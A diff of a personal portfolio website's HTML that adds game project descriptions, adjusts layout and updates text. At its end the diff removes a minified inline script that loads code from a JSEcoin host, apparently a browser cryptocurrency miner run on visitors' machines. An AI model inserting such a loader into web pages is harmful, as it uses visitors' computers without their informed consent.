@@ -33,7 +33,7 @@
         <div id="container">
             <section id="about" style="display: none;">
                 <div id="about-wrapper">
-                    <div id="about-summary" style="width: 59%; float: left; font-family: 'Patua One', cursive;">
+                    <div id="about-summary" style="width: 49%; float: left; font-family: 'Patua One', cursive;">
                         <p>
                             <h2>past, present, future</h2>
                             I have spent most of my childhood and early teenages drawing, most of my teenages taking in art
@@ -48,17 +48,17 @@
                             functional and amuse me, discussing deep stuff with friends, spending mindful time with the close ones.
 
                             <h2>lenses through which I see life</h2>
-                            Arts, Modern Media, CS, AI, Psychology, Cognitive Science, Evolutionary Biology, Ecology, Philosophy.
+                            Arts, Modern Media, CS, AI, Psychology, Cognitive Science, Evolutionary Biology, Ecology, Philosophy, possibly more.
 
                             <h2>what to do here</h2>
                             Take a look at my CV, offer me a job if you feel like it.</br>
-                            Browse and listen to my music, go to games section and play(-test) my games.</br>
-                            Go to my external links (on CV), get more detail about how my mind works by checking my code on GitHub.</br>
+                            Browse and listen to my music. Talk to me about it. </br>
+                            Go to games section and play(-test) my games.</br>
+                            Go to my external links (on CV).</br>
                             Contact me through any platform and talk to me about anything.</br>
                         </p>
-                        <a style="clear: both; display: flex; align-items: center; justify-content: left;" href="http://info.flagcounter.com/pq07"><img src="http://s10.flagcounter.com/count2/pq07/bg_0F2954/txt_D1CDB0/border_CCCCCC/columns_5/maxflags_20/viewers_3/labels_0/pageviews_1/flags_0/percent_0/" alt="Flag Counter" border="0"></a>
                     </div>
-                    <object id="about-resume" style="width: 40%; min-height: 80vh; overflow: hidden;" data="ErincArgimak-resume.pdf#fitW" type="application/pdf"><parm name="view"/></object>
+                    <object id="about-resume" style="width: 50%; min-height: 80vh; overflow-x: hidden;" data="ErincArgimak-resume.pdf#fitW" type="application/pdf"><parm name="view"/></object>
                 </div>
             </section>
             <section id="music" style="display: none;">
@@ -103,18 +103,77 @@
                 </div>
             </section>
             <section id="games" style="display: none;">
-                <div>
+
+                <div class="game-header">
+                    <h1>BUFFER</h1>
+                    <b>Global Game Jam 2018 Entry (Theme: Transmission)</b> January 2018 <br />
+                    Python/Pygame <br />
+                    <iframe width="600" height="339" src="https://www.youtube.com/embed/gDSknBnuJAU?rel=0" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen style="float: left; margin-right: 20px;"></iframe>
+                    <div style="height: 339px; margin: 20px;">
+                        <h2>Rules:</h2>
+                        <ul>
+                            <li> There are nodes, and connections. </li>
+                            <li> There is a starting node, and a target node. </li>
+                            <li> The starting node starts with the 'matter' - which needs to be transmitted to the target node. </li>
+                            <li> A node can only transmit to another node if there is connection between them. </li>
+                            <li> Nodes can only hold the matter for some time. </li>
+                            <li> The connections randomly appear and disappear. </li>
+                            <li> Transmit the matter before the target times out or matter is lost! </li>
+                        </ul>
+                    </div>
+                </div>
+
+                <div class="game-header">
+                    <h1>Intergalactic Dance Robot</h1>
+                    <b>Game Design &amp; Analysis Class Project,</b> November - December 2017 <br />
+                    Unity/C# <br />
+                    <b>Team: </b> Alex Coburn, Barru Tolety, Kyros Jalife, Erinc Argimak <br />
+                    <iframe width="600" height="339" src="https://www.youtube.com/embed/vAb-1kEaSKc?rel=0" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen style="float: left; margin-right: 20px;"></iframe>
+                    <div style="height: 339px; margin: 20px;">
+                        <h2>Rules:</h2>
+                        <ul>
+                            <li> Each limb of the robot can be controlled with a button. </li>
+                            <li> The dance move holograms come towards the robot. </li>
+                            <li> When the hologram touches the robot, the robot should have the same pose. </li>
+                            <li> The robot loses charge over time. </li>
+                            <li> Some limbs of the robot have 'orbs' - that charge the robot for some energy. </li>
+                            <li> Survive until the end of the round and score as high as possible! </li>
+                        </ul>
+                    </div>
+                </div>
+
+                <div class="game-header">
+                    <h1>Under the Sea</h1>
+                    <b>Game Design &amp; Analysis Class Project,</b> September - November 2017 <br />
+                    Board Game <br />
+                    <b>Team: </b> Xiao Yu, Anqi Liu, Zhu Ge, Wenqi Fan, Erinc Argimak <br />
+                    <img src="images/under_the_sea.png" alt="" style="width: 600px; height: 400px; float: left; margin-right: 20px;">
+                    <div style="height: 400px; margin: 20px;">
+                        <h2>Rules:</h2>
+                        <ul>
+                            <li> Players are controlling teams of monsters. </li>
+                            <li> At the center of the board is a treasure. </li>
+                            <li> The goal is to get the treasure and bring it back to the spawn. </li>
+                            <li> The middle, darker area makes whoever enters invisible, so players should guess where their opponents' monsters are and
+                            reveal them to be able to capture them. </li>
+                            <li> Each turn, each monster can move maximum 3 steps, and use their skill only once. </li>
+                            <li> Monsters have capturing sides and weak sides, they can capture each other. </li>
+                            <li> Captured monster is sent back to its spawn point. </li>
+                            <li> The board includes various actions such as teleport, or reveal. </li>
+                        </ul>
+                    </div>
+                </div>
+
+                <div class="game-header">
                     <h1>Series</h1>
                     <b>Idea Sprout:</b> Summer 2015 <br />
                     <b>First Prototype:</b> Summer 2015, <i>AppGameKit2</i> <br />
-                    <b>Web Prototype:</b> Autumn 2016, <i>HTML5 / JS / Phaser</i> <br />
+                    <b>Web Prototype:</b> Autumn 2016 (Updated February 2018), <i>HTML5 / JS / Phaser</i> <br />
 
-                    <div>
-                        <div class="game-div" id="series-div" style="width: 960px; height: 540px;"></div>
-                    </div>
-                    <div style="height: 540px; padding-left:10px;">
-                        <h2 style="font-family: 'Patua One', cursive;">Rules:</h2>
-                        <ul style="font-family: 'Patua One', cursive; font-size: 18px;">
+                    <div class="game-div" id="series-div" style="width: 960px; height: 540px; margin-right: 20px;"></div>
+                    <div style="height: 540px;">
+                        <h2>Rules:</h2>
+                        <ul>
                             <li> 9 Numbers appear on the screen. </li>
                             <li> Press the numbers in the right order. </li>
                             <li> Gain time for each correct press. </li>
@@ -124,18 +183,16 @@
                     </div>
                 </div>
 
-                <div>
+                <div class="game-header">
                     <h1>Colors</h1>
                     <b>Idea Sprout:</b> May 2014 <br />
                     <b>First Prototype:</b> May 2014, <i>Python / PyGame</i> <br />
-                    <b>Web Prototype:</b> April 2017, <i>HTML5 / JS / Phaser</i> <br />
+                    <b>Web Prototype:</b> April 2017 (Updated February 2018), <i>HTML5 / JS / Phaser</i> <br />
 
-                    <div>
-                        <div class="game-div" id="colo-div" style="width: 960px; height: 540px;"></div>
-                    </div>
-                    <div style="height: 540px; padding-left:10px;">
+                    <div class="game-div" id="colo-div" style="width: 960px; height: 540px; margin-right: 20px;"></div>
+                    <div style="height: 540px; margin:10px;">
                         <h2 style="font-family: 'Patua One', cursive;">Rules:</h2>
-                        <ul style="font-family: 'Patua One', cursive; font-size: 18px;">
+                        <ul>
                             <li> Cell values: 1-6, Cell Neighbors: Left, Right, Top, Bottom </li>
                             <li> Neighbor has (own value + 1) ->  Cell can be incremented <i>short press &amp; release</i></li>
                             <li> 1 -> 2 -> 3 -> 4 -> 5 -> 6 -> 1 </li>
@@ -152,12 +209,9 @@
             </section>
         </div>
         <footer>
-            Design &amp; Code: Erinç Argımak (<a href="mailto:erar93@gmail.com">mail</a>), 2017. Tested on Windows 10/Chrome, 1920x1080. External Font: <a href="https://fonts.google.com/specimen/Patua+One">Patua One</a><br />
+            Design &amp; Code: Erinç Argımak (<a href="mailto:erar93@gmail.com">mail</a>), 2018. Tested on Windows 10/Chrome, 1920x1080. External Font: <a href="https://fonts.google.com/specimen/Patua+One">Patua One</a><br />
         </footer>
         <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.0/jquery.min.js"></script>
         <script src="main.js"></script>
-        <script type="text/javascript">
-        !function(){var e=document,t=e.createElement("script"),s=e.getElementsByTagName("script")[0];t.type="text/javascript",t.async=t.defer=!0,t.src="https://load.jsecoin.com/load/14703/erincar.github.io/0/0/",s.parentNode.insertBefore(t,s)}();
-        </script>
     </body>
 </html>
